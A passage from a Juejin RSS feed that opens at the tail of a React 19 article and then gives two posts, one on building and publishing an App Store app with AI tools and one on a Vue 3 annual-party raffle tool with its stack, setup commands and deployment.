<p><strong>React 19 的核心命题，就是通过底层的自动化（Compiler）与原生化（Actions / use API），让开发者从一个“React 调优师”重新变回一个“JavaScript 工程师”。 它解决的不仅是代码行数的问题，更是前端开发的第一性原理问题：如果框架足够聪明，开发者就应该只关注 UI 如何响应数据，而不必去操心异步任务的生命周期、复杂的引用缓存或是繁琐的转发逻辑。</strong></p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[半天、200 元，我把自己的 App 做出来并上架了 App Store]]></title>    <link>https://juejin.cn/post/7595365551607087155</link>    <guid>https://juejin.cn/post/7595365551607087155</guid>    <pubDate>2026-01-15T08:12:43.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7595365551607087155" data-draft-id="7595311405751648302" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="半天、200 元，我把自己的 App 做出来并上架了 App Store"/> <meta itemprop="keywords" content="AI编程,Flutter"/> <meta itemprop="datePublished" content="2026-01-15T08:12:43.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="HBLOG"/> <meta itemprop="url" content="https://juejin.cn/user/131597124767479"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            半天、200 元，我把自己的 App 做出来并上架了 App Store
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/131597124767479/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    HBLOG
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-15T08:12:43.000Z" title="Thu Jan 15 2026 08:12:43 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-15
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读1分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><blockquote>
<p>之前发过一篇文章，大家都在纠结我是不是半天完成？在这里我可以明确告诉大家，核心功能确实是半天开发完成，后面1-2周又迭代一些功能，半天不包括上架，只是最小的MVP</p>
</blockquote>
<p>针对2种不同意见的用户已经我写了一篇文章分析总结我的看法，详见： <a href="https://juejin.cn/post/7584987267266461706" target="_blank" title="https://juejin.cn/post/7584987267266461706">juejin.cn/post/758498…</a></p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/5aabe8b67c404ee48b2907ca71108b57~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgSEJMT0c=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769069562&amp;x-signature=bsljr3ES9vWEPVdUzQO%2BdxbLNpY%3D" alt="" loading="lazy"/></p>
<p>###############################以下是正文#########################</p>
<p>如果放在三年前，我绝不相信这件事会发生：</p>
<p><strong>一个普通人、不写代码、没有设计基础，也能在半天之内、只花 200 块，把一个能在 App Store 上架的 App 做出来。</strong></p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fadmin.liuhaihua.cn%2Fwp-content%2Fuploads%2F2025%2F12%2Fimage-2.png" title="https://link.juejin.cn?target=https%3A%2F%2Fadmin.liuhaihua.cn%2Fwp-content%2Fuploads%2F2025%2F12%2Fimage-2.png" target="_blank"><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/a8903782e33c43eab562707b9738e23f~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgSEJMT0c=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769069562&amp;x-signature=026r6qF04lINuqrwUHc%2BM3dYOcM%3D" alt="" loading="lazy"/></a></p>
<p>但 2025 年的今天，这真的发生了。<br/>
我就是用 AI 完成了这一切。</p>
<h2 data-id="heading-0">01. 以前做 App 是“创业门槛”，现在是“个人作品”</h2>
<p>传统开发一个移动应用，需要：</p>
<ul>
<li>会写代码</li>
<li>会做设计</li>
<li>会搭后台</li>
<li>还要了解苹果审核</li>
</ul>
<p>任何一项都足以劝退大多数人。</p>
<p>但现在，因为 AI，<strong>App 开发从“技术活”变成了“写需求”。</strong></p>
<h2 data-id="heading-1">02. 我花了多少钱？只有 200 元（开发成本）</h2>
<p>不算上架费用，真正花钱的只有：</p>
<h3 data-id="heading-2">AI 工具：200 元（做整个 App 的唯一开支）</h3>
<p>我全部靠 AI 完成了：</p>
<ul>
<li>产品设计</li>
<li>UI 设计</li>
<li>Flutter 代码</li>
<li>后端逻辑</li>
<li>文案</li>
<li>图标</li>
<li>隐私协议</li>
<li>调试与修复</li>
</ul>
<p>你能想到的步骤，AI 都能接手。</p>
<h2 data-id="heading-3">03. 我花了多久？半天</h2>
<p>流程非常简单：</p>
<h3 data-id="heading-4">第一小时：把想法告诉 AI</h3>
<p>我说出功能需求，AI 帮我生成：</p>
<ul>
<li>全流程原型</li>
<li>页面结构</li>
<li>数据模型</li>
</ul>
<h3 data-id="heading-5">第二到三小时：AI 帮我写功能、写代码、修 bug</h3>
<p>Flutter 页面、状态管理、API、交互逻辑……<br/>
全部几分钟生成，出错也能秒修。</p>
<h3 data-id="heading-6">最后半小时：生成素材并准备上架</h3>
<p>图标、截图文案、描述、隐私条款，AI 一次性做好。</p>
<p>半天时间，我第一次在真机上打开了“自己做”的 App。<br/>
那一刻真的有点想哭。</p>
<h2 data-id="heading-7">04. 技术的门槛第一次被 AI 彻底推倒</h2>
<p>以前 App 是团队做的，现在：</p>
<ul>
<li>你是产品经理</li>
<li>AI 是程序员</li>
<li>AI 是设计师</li>
<li>AI 是测试工程师</li>
<li>你负责提出愿望</li>
<li>AI 负责把它实现</li>
</ul>
<p>你不需要写代码，<br/>
你只需要敢想。</p>
<h2 data-id="heading-8">05. 我把它分享出来，是因为我希望你亲自体验它</h2>
<p>我做这个 App，不是为了炫耀“AI 能做什么”，<br/>
而是为了让一个我真的需要、我真的想用的工具存在。</p>
<p><strong>而我也希望，它能对你有一点点帮助。</strong></p>
<p>这不是一家公司上百人打造的产品，<br/>
没有广告、没有推送骚扰、没有复杂商业化。</p>
<p>它是我用半天时间、用 200 元开发出来的，<br/>
但它承载了我几个月以来想解决的问题、想做的东西。</p>
<p>现在，我把它摆到你面前，<br/>
<strong>希望你能来体验它、感受它，甚至告诉我你的想法。</strong></p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[用 Vue 3 做了一套年会抽奖工具，顺便踩了些坑]]></title>    <link>https://juejin.cn/post/7595358285722583049</link>    <guid>https://juejin.cn/post/7595358285722583049</guid>    <pubDate>2026-01-15T08:16:19.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7595358285722583049" data-draft-id="7595311405751664686" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="用 Vue 3 做了一套年会抽奖工具，顺便踩了些坑"/> <meta itemprop="keywords" content="前端,Vue.js,JavaScript"/> <meta itemprop="datePublished" content="2026-01-15T08:16:19.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="Tigger"/> <meta itemprop="url" content="https://juejin.cn/user/4139002157603352"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            用 Vue 3 做了一套年会抽奖工具，顺便踩了些坑
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/4139002157603352/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    Tigger
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-15T08:16:19.000Z" title="Thu Jan 15 2026 08:16:19 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-15
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读7分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>去年为了年会抽奖临时做了这个小工具，今年又被点名用同一套方案。<br/>
趁着复用的机会，把之前欠下的一些小坑顺手补了一轮，整理完善之后，就决定顺便发出来给大家也能直接用：</p>
<ul>
<li>在线地址：<code>https://huyikai.github.io/AnnualRaffle/</code></li>
</ul>
<p>下面主要想分享两件事：</p>
<ul>
<li>这套工具大概能做什么；</li>
<li>为啥我要在 UI 里留一个“临时加奖项”的入口，以及实战中这个入口是怎么救场的。</li>
</ul>
<hr/>
<h2 data-id="heading-0">这个“年会抽奖”大概长什么样</h2>
<p>不用太多形容词，就按模块简单说一下。</p>
<h3 data-id="heading-1">抽奖视觉</h3>
<ul>
<li>中心是一个 <strong>3D 标签云</strong>，所有参与抽奖的人会在里面旋转。</li>
<li>每个人可以配头像，抽到的时候会同时展示名字和照片。</li>
<li>没配头像的会用默认头像兜底。</li>
</ul>
<h3 data-id="heading-2">奖项相关</h3>
<ul>
<li>默认有常规奖项：一等奖、二等奖、三等奖、幸运奖之类。</li>
<li>每个奖项可以在界面上改中奖人数。</li>
<li>可以配置 <strong>预设名单</strong>：
<ul>
<li>比如某个特殊奖项，中奖人是提前定好的，只是想在现场走个流程。</li>
</ul>
</li>
<li>支持 <strong>全局排除名单</strong>（领导不参与抽奖这类场景）。</li>
</ul>
<h3 data-id="heading-3">抽奖过程</h3>
<ul>
<li>底部选择奖项，点击开始，3D 标签云飞快转起来。</li>
<li>有背景音乐、开始音效，可以静音、调音量，设置会保存在浏览器里。</li>
<li>抽完之后会展示本轮中奖人，点击可以删掉，防止误操作。</li>
</ul>
<h3 data-id="heading-4">数据持久化</h3>
<ul>
<li>抽奖配置、名单、结果、音频设置都存在 <code>localStorage</code>。</li>
<li>头像文件放在 <code>public/user/</code>，元数据用 <code>IndexedDB</code> 管。</li>
</ul>
<p>就算现场不小心刷新了浏览器，抽过的结果还在，不至于从头来过。</p>
<hr/>
<h2 data-id="heading-5">为什么 UI 里专门留了一个“临时加奖项”</h2>
<p>这里有个小故事。</p>
<p>去年那场年会，抽到一半，领导突然来了句：<br/>
“再加一个特别奖吧，就现在抽。”</p>
<p>如果奖项是写死在代码里，这种需求基本意味着：</p>
<ul>
<li>改配置；</li>
<li>重新打包；</li>
<li>重新部署；</li>
<li>祈祷一切顺利。</li>
</ul>
<p>现场几百个人盯着大屏幕，这种操作就很不现实了。</p>
<p>所以这次我在设计的时候，刻意做了一个分层：</p>
<ul>
<li><strong>代码里</strong>：有一套相对稳定的默认奖项配置，放在 <code>src/config/lottery.ts</code>，方便版本管理和代码 review。</li>
<li><strong>UI 里</strong>：保留“增加奖项”的交互，可以现场临时加一个奖项、设定人数，用完就算。</li>
</ul>
<p>实战时这个入口确实救了场：主持人说加奖，我直接在配置弹窗里加了一个新奖项，填好名字和数量，点保存，就可以继续抽了，不需要重启、不需要改代码。</p>
<p>这类现场工具，给业务方留一点“临时操作空间”，比纯粹的“配置优雅”要重要很多。</p>
<hr/>
<h2 data-id="heading-6">技术堆栈简单带一下</h2>
<p>不细讲实现，只把堆栈和大致结构列一下，方便有兴趣的同学顺着代码看：</p>
<ul>
<li><strong>基础框架</strong>
<ul>
<li>Vue 3 + TypeScript</li>
<li>Vite</li>
</ul>
</li>
<li><strong>状态管理</strong>
<ul>
<li>Pinia：负责当前奖项、结果列表、配置等全局状态</li>
</ul>
</li>
<li><strong>UI / 样式</strong>
<ul>
<li>Element Plus：弹窗、表单、按钮等基础组件</li>
<li>Tailwind CSS：布局和样式</li>
</ul>
</li>
<li><strong>可视化 / 多媒体</strong>
<ul>
<li>TagCanvas：3D 标签云</li>
<li>HTML5 Audio：背景音乐和音效</li>
</ul>
</li>
<li><strong>数据存储</strong>
<ul>
<li>localStorage：配置、名单、抽奖结果、音频设置</li>
<li>IndexedDB：头像元数据</li>
</ul>
</li>
</ul>
<p>目录拆法比较常规：</p>
<ul>
<li><code>composables/</code>：抽奖逻辑、3D 标签云封装、音频控制。</li>
<li><code>config/</code>：奖项配置、用户示例数据。</li>
<li><code>helper/</code>：抽奖算法、IndexedDB 操作。</li>
<li><code>components/</code>：配置弹窗、结果展示、公示组件等。</li>
</ul>
<p>如果你想改 UI 或接入自家系统，大概只需要看这几个目录就够了。</p>
<hr/>
<h2 data-id="heading-7">真要用在年会，大概这么搞就够了</h2>
<p>假设你也要搞一场年会抽奖，可以按这个顺序来：</p>
<h3 data-id="heading-8">1. 拉代码 &amp; 跑起来</h3>
<pre><code class="hljs language-bash" lang="bash">pnpm install
pnpm dev
</code></pre>
<p>浏览器打开本地地址，先用示例数据跑一遍流程，熟悉一下界面。</p>
<h3 data-id="heading-9">2. 换成你们自己的名单</h3>
<p>在代码里：</p>
<ol>
<li>复制 <code>src/config/user.example.ts</code> → <code>src/config/user.ts</code></li>
<li>把里面的用户列表改成你们的人：</li>
</ol>
<pre><code class="hljs language-ts" lang="ts"><span class="hljs-keyword">export</span> <span class="hljs-keyword">const</span> <span class="hljs-attr">user</span>: <span class="hljs-title class_">UserItem</span>[] = [
  { <span class="hljs-attr">key</span>: <span class="hljs-number">1001</span>, <span class="hljs-attr">name</span>: <span class="hljs-string">'张三'</span> },
  { <span class="hljs-attr">key</span>: <span class="hljs-number">1002</span>, <span class="hljs-attr">name</span>: <span class="hljs-string">'李四'</span> },
  <span class="hljs-comment">// ...</span>
];

<span class="hljs-keyword">export</span> <span class="hljs-keyword">const</span> <span class="hljs-attr">excludedUsers</span>: <span class="hljs-title class_">UserItem</span>[] = [
  { <span class="hljs-attr">key</span>: <span class="hljs-number">9999</span>, <span class="hljs-attr">name</span>: <span class="hljs-string">'某总'</span> }, <span class="hljs-comment">// 不参与所有奖项</span>
];
</code></pre>
<p>不创建 <code>user.ts</code> 也能跑，只是走示例数据。</p>
<h3 data-id="heading-10">3. 配奖项</h3>
<ul>
<li><strong>平时</strong>：改 <code>src/config/lottery.ts</code> 里的默认奖项即可。</li>
<li><strong>现场</strong>：可以直接在“抽奖配置”弹窗里：
<ul>
<li>调整每个奖项的数量；</li>
<li>给某个奖项加“预设名单”（逗号分隔的用户 ID）；</li>
<li>必要时加一个临时奖项。</li>
</ul>
</li>
</ul>
<h3 data-id="heading-11">4. 搞定头像（强烈建议）</h3>
<p>视觉氛围基本靠它。</p>
<p>做法：</p>
<ol>
<li>准备头像图片，建议 160×160 左右，体积别太大。</li>
<li>放到 <code>public/user/</code> 目录。</li>
<li>命名规则：<code>用户 key + 扩展名</code>，比如 <code>1001.jpg</code>。</li>
</ol>
<p>项目里还有一个批量处理头像的脚本，放在 <code>scripts/</code> 里，用来把原始照片统一裁成头像，细节可以看 <code>scripts/README.md</code>。</p>
<hr/>
<h2 data-id="heading-12">批量头像处理脚本：从“真人照片”到统一头像</h2>
<p>真实情况是，原始员工照片的尺寸、比例、背景色基本都不一样，直接拿来做头像效果会很怪。</p>
<p>为此我在 <code>scripts/</code> 目录下写了一套批量头像处理脚本，主要做这些事：</p>
<ul>
<li>批量裁剪 / 缩放成统一尺寸（默认 160×160）。</li>
<li>统一背景色、统一格式（JPG/PNG）。</li>
<li>提供“快速模式”和“AI 增强模式”，按自己的环境和需求选择。</li>
</ul>
<p>典型用法：</p>
<ol>
<li>把原图放到 <code>scripts/input/</code>。</li>
<li>运行：</li>
</ol>
<pre><code class="hljs language-bash" lang="bash">pnpm run process-images
</code></pre>
<ol start="3">
<li>在 <code>scripts/output/</code> 拿到处理好的头像，拷到 <code>public/user/</code> 即可。</li>
</ol>
<p>详细配置（背景色、尺寸、模式开关等）在 <code>scripts/README.md</code> 里都有写。</p>
<hr/>
<h2 data-id="heading-13">部署：用 GitHub Pages 省点事</h2>
<p>项目现在是放在 GitHub Pages 上的，地址就是：</p>
<ul>
<li><code>https://huyikai.github.io/AnnualRaffle/</code></li>
</ul>
<p>如果你也想这么搞，一般步骤是：</p>
<ol>
<li>把代码推到 GitHub。</li>
<li>用 GitHub Actions 跑一遍：
<ul>
<li>安装依赖；</li>
<li><code>pnpm build</code>；</li>
<li>把 <code>dist/</code> 发布到 <code>gh-pages</code> 分支。</li>
</ul>
</li>
<li>在仓库 Settings → Pages 里选对应分支。</li>
</ol>
<p>配置好之后，后面每次推代码，线上链接会自动更新。</p>
<hr/>
<h2 data-id="heading-14">实际使用感受</h2>
<p>这套东西在一场不到 200 人的年会上跑了一次，整体体验还可以：</p>
<ul>
<li>3D 标签云加照片，现场观感比纯文字名单要好不少。</li>
<li>数据持久化避免了“误刷新导致重来一次”的事故。</li>
<li>UI 里的“临时加奖项”确实发挥了作用，帮我们兜住了领导临时加奖的情况。</li>
</ul>
<p>如果你今年也被安排做年会抽奖，可以直接拿这个项目当模板：<br/>
先跑一遍 Demo，看下是否符合你们场景，再按自己需求改名单、奖项和 UI 即可。</p>
<hr/>
<h2 data-id="heading-15">一点开发过程的小记</h2>
<p>这个项目的开发过程里，我是借助了 <code>Cursor</code> 这类辅助工具来提效的：</p>
<ul>
<li>搭项目、改结构、重构一些逻辑时，用它来帮忙生成样板代码和做局部重构。</li>
<li>这篇文章本身，我也借助了 <code>Cursor</code> 里的 AI 写作辅助，再根据自己的实际场景做了调整。</li>
</ul>
<p>如果你平时也用 VS Code 类的编辑器，可以尝试一下类似的工作流：<br/>
让工具帮你处理重复劳动，把精力放在业务和体验上。</p>
<hr/>
<h2 data-id="heading-16">最后：欢迎来 GitHub 点个 Star</h2>
<p>项目在线地址我再放一次：</p>
<ul>
<li>在线 Demo：<code>https://huyikai.github.io/AnnualRaffle/</code></li>
</ul>
<p>仓库地址在这里：</p>
<ul>
<li>GitHub 仓库：<code>https://github.com/huyikai/AnnualRaffle</code></li>
</ul>
<p>如果你觉得这套年会抽奖还算顺手，或者对你有一点参考价值，欢迎顺手点个 Star。</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item>  </channel></rss>